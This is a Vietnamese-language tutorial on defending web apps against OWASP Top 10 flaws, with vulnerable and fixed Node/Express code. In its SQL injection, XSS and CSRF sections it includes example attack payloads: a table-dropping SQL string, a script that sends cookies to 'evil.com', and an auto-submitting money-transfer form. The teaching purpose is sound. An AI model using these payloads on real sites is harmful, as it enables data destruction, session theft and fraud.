# 🛡️ Web Security nâng cao — OWASP Top 10

> `[INTERMEDIATE → ADVANCED]` — Phòng thủ các lỗ hổng phổ biến nhất

---

## OWASP Top 10 (2021) — Tóm tắt

| # | Lỗ hổng | Mức độ |
|---|---|---|
| A01 | Broken Access Control | 🔴 Critical |
| A02 | Cryptographic Failures | 🔴 Critical |
| A03 | Injection (SQL, XSS, Command) | 🔴 Critical |
| A07 | Cross-Site Scripting (XSS) | 🟡 High |
| A08 | Insecure Deserialization | 🟡 High |
| A09 | Using Components with Known Vulns | 🟡 High |

---

## 1. SQL Injection

```javascript
// ❌ VULNERABLE
const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
// Attack: email = "'; DROP TABLE users; --"
// → SELECT * FROM users WHERE email = ''; DROP TABLE users; --'

// ✅ Parameterized Queries
const result = await db.query(
    'SELECT * FROM users WHERE email = $1 AND password = $2',
    [email, hashedPassword]
);

// ✅ ORM (Prisma) — auto-escaped
const user = await prisma.user.findFirst({
    where: { email, password: hashedPassword },
});
```

---

## 2. Cross-Site Scripting (XSS)

```html
<!-- ❌ VULNERABLE: Stored XSS -->
<div>${userComment}</div>
<!-- Attack: userComment = '<script>fetch("evil.com?cookie="+document.cookie)</script>' -->

<!-- ✅ Escape HTML output -->
<div>${escapeHtml(userComment)}</div>
```

```javascript
// Escape function
function escapeHtml(str) {
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

// React tự escape by default! ✅
<p>{userInput}</p>                     // Safe
<p dangerouslySetInnerHTML={{__html: userInput}} /> // ❌ DANGEROUS!

// Content Security Policy header
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'"],         // Chỉ cho phép scripts từ domain mình
            styleSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "https:"],
            connectSrc: ["'self'", "https://api.example.com"],
        },
    },
}));
```

---

## 3. CSRF — Cross-Site Request Forgery

```
Attack:
1. User đăng nhập bank.com (có session cookie)
2. User mở evil.com
3. evil.com có hidden form:
   <form action="https://bank.com/transfer" method="POST">
       <input name="to" value="attacker">
       <input name="amount" value="1000000">
   </form>
   <script>document.forms[0].submit();</script>
4. Browser gửi POST kèm session cookie → tiền bị chuyển!

Protection:
```

```javascript
// CSRF Token
import csrf from 'csurf';

app.use(csrf({ cookie: true }));

app.get('/form', (req, res) => {
    res.render('form', { csrfToken: req.csrfToken() });
});

// Form phải có token
// <input type="hidden" name="_csrf" value="${csrfToken}">

// SameSite Cookie (modern approach) ⭐
res.cookie('session', token, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',  // Không gửi cookie từ domain khác
});
```

---

## 4. Broken Access Control

```javascript
// ❌ IDOR (Insecure Direct Object Reference)
app.get('/api/users/:id/profile', async (req, res) => {
    const profile = await db.profiles.findById(req.params.id);
    res.json(profile);  // BẤT KỲ user nào cũng xem được profile người khác!
});

// ✅ Kiểm tra ownership
app.get('/api/users/:id/profile', authMiddleware, async (req, res) => {
    if (req.user.id !== parseInt(req.params.id) && req.user.role !== 'admin') {
        return res.status(403).json({ error: 'Forbidden' });
    }
    const profile = await db.profiles.findById(req.params.id);
    res.json(profile);
});

// ❌ Privilege Escalation
app.put('/api/users/:id', async (req, res) => {
    await db.users.update(req.params.id, req.body);  // User tự set role: "admin"!
});

// ✅ Whitelist allowed fields
app.put('/api/users/:id', authMiddleware, async (req, res) => {
    const { name, email, avatar } = req.body;  // Chỉ cho phép update fields này
    await db.users.update(req.params.id, { name, email, avatar });
});
```

---

## 5. Security Headers

```javascript
import helmet from 'helmet';

app.use(helmet());
// Tự động thêm các headers:
// X-Content-Type-Options: nosniff
// X-Frame-Options: DENY
// X-XSS-Protection: 0 (deprecated, dùng CSP thay thế)
// Strict-Transport-Security: max-age=31536000
// Content-Security-Policy: ...
// Referrer-Policy: no-referrer

// Manual headers
app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
    next();
});
```

---

## 6. Dependency Security

```bash
# npm — kiểm tra vulnerabilities
npm audit
npm audit fix

# Snyk — scan chi tiết hơn
npx snyk test
npx snyk monitor    # Continuous monitoring

# Dependabot (GitHub) — auto-create PRs cho updates
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
```

---

## 7. Input Validation & Sanitization

```javascript
import { z } from 'zod';
import DOMPurify from 'isomorphic-dompurify';

// Validate
const userSchema = z.object({
    name: z.string().min(2).max(100).regex(/^[a-zA-Z\s]+$/),
    email: z.string().email(),
    age: z.number().int().min(0).max(150),
    bio: z.string().max(500).optional(),
    url: z.string().url().optional(),
});

// Sanitize HTML (nếu cho phép rich text)
const cleanHtml = DOMPurify.sanitize(userInput, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href'],
});

// Rate limiting per endpoint
const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 5,
    message: 'Too many attempts',
});
app.use('/api/auth/login', loginLimiter);
```

---

## Security Checklist

```
Authentication:
☐ Passwords hashed (bcrypt, cost ≥ 12)
☐ JWT: short expiry + refresh tokens
☐ Rate limit login (5 attempts/15 min)
☐ 2FA cho admin accounts

Authorization:
☐ RBAC middleware cho mọi protected routes
☐ Check ownership trước update/delete
☐ Whitelist allowed fields trong update

Data:
☐ Parameterized queries (no SQL injection)
☐ Input validation (Zod/Joi)
☐ Output escaping (XSS prevention)
☐ Sanitize HTML (DOMPurify)

Transport:
☐ HTTPS everywhere
☐ HSTS header
☐ Secure cookie flags (httpOnly, secure, sameSite)
☐ CORS whitelist (no wildcard in production)

Infrastructure:
☐ npm audit clean
☐ Dependabot enabled
☐ Security headers (Helmet)
☐ CSP (Content Security Policy)
☐ Environment variables (no hardcoded secrets)
```

---

## Bài tập thực hành

- [ ] Audit app hiện tại: chạy npm audit + fix
- [ ] Implement CSP header → test với CSP Evaluator
- [ ] Setup rate limiting cho auth endpoints
- [ ] Viết integration test cho access control (IDOR prevention)

---

## Tài nguyên thêm

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) — Official
- [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/) — Practical guides
- [Security Headers](https://securityheaders.com/) — Scan your site
